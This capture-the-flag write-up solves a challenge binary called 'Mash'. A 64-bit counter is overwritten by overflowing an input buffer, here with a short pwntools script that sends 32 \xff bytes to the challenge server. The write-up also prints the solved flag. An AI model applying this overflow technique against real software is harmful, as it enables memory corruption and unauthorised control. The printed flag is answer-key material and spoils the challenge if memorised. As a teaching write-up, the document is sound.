# Mash

Lets just run that binary
```HOW FAST CAN YOU PRESS ENTER???
PRESS ENTER TO COUNT UP, FLAG WHEN CURRENT COUNT == 0xffffffffffffffff
CURRENT COUNT: 0000000000000000
```

hmm, looks like we would have to press that enter button about 18446744073709551615 times.  Doesnt seem that doable, so lets try another approach.

Typing a bunch of `A`s we get:
```HOW FAST CAN YOU PRESS ENTER???
PRESS ENTER TO COUNT UP, FLAG WHEN CURRENT COUNT == 0xffffffffffffffff
CURRENT COUNT: 0000000000000000
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
PRESS ENTER TO COUNT UP, FLAG WHEN CURRENT COUNT == 0xffffffffff000a41
CURRENT COUNT: 0x4141414141414141
```

Interesting, looks like we can override the buffer here and have control over it.  After bessing around a bit, I realized I could fill the buffer with `\xff * 32`, so thats what I did.
```python
from pwn import *

io = remote('ctf.ropcity.com', 31337)
#io = process("./mash")

padding = "\xff"*32
io.sendline(padding)

io.interactive()
```
And running the script we get the flag!
```
HOW FAST CAN YOU PRESS ENTER???
PRESS ENTER TO COUNT UP, FLAG WHEN CURRENT COUNT == 0xffffffffffffffff
CURRENT COUNT: 0000000000000000
osu{n3xt_1evel_butt0N_maSh1ng}
```

